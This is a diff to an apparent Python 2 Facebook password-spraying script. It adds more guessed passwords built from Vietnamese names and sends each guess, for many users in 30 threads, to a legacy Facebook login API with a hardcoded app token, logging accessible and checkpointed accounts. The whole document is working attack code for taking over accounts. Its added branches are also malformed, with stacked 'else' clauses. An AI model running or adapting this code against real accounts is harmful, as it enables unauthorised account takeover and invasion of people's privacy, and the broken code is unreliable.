@@ -324,7 +324,7 @@ def pb():
 			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
 			                                oks.append(user+ps4)
 			                            else:
-			                                ps5=('Pakistan')
+			                                ps5=('phamlong')
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                k=json.load(dt)
 			                                if 'www.facebook.com' in k['error_msg']:
@@ -345,6 +345,61 @@ def pb():
 			                                            if 'access_token' in k:
 			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps6)
 			                                                oks.append(user+ps6)
+			                                    else:
+			                                        ps7=('nguyenlong')
+			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps7)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                        k=json.load(dt)
+			                                        if 'www.facebook.com' in k['error_msg']:
+			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps7)
+			                                            cps.append(user+ps7)
+			                                        else:
+			                                            if 'access_token' in k:
+			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps7)
+			                                                oks.append(user+ps7)
+			                                    else:
+			                                        ps8=('phamhuyen')
+			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps8)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                        k=json.load(dt)
+			                                        if 'www.facebook.com' in k['error_msg']:
+			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps8)
+			                                            cps.append(user+ps8)
+			                                        else:
+			                                            if 'access_token' in k:
+			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps8)
+			                                                oks.append(user+ps8)
+			                                    else:
+			                                        ps9=('nguyenlong')
+			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps9)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                        k=json.load(dt)
+			                                        if 'www.facebook.com' in k['error_msg']:
+			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps9)
+			                                            cps.append(user+ps9)
+			                                        else:
+			                                            if 'access_token' in k:
+			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps9)
+			                                                oks.append(user+ps9)
+			                                    else:
+			                                        ps10=('nguyenlan')
+			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps10)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                        k=json.load(dt)
+			                                        if 'www.facebook.com' in k['error_msg']:
+			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps10)
+			                                            cps.append(user+ps10)
+			                                        else:
+			                                            if 'access_token' in k:
+			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps10)
+			                                                oks.append(user+ps10)
+			                                    else:
+			                                        ps11=('nguyenthuy')
+			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps11)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                        k=json.load(dt)
+			                                        if 'www.facebook.com' in k['error_msg']:
+			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps11)
+			                                            cps.append(user+ps11)
+			                                        else:
+			                                            if 'access_token' in k:
+			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps11)
+			                                                oks.append(user+ps11)
 		except:
 			pass
 	p=ThreadPool(30)
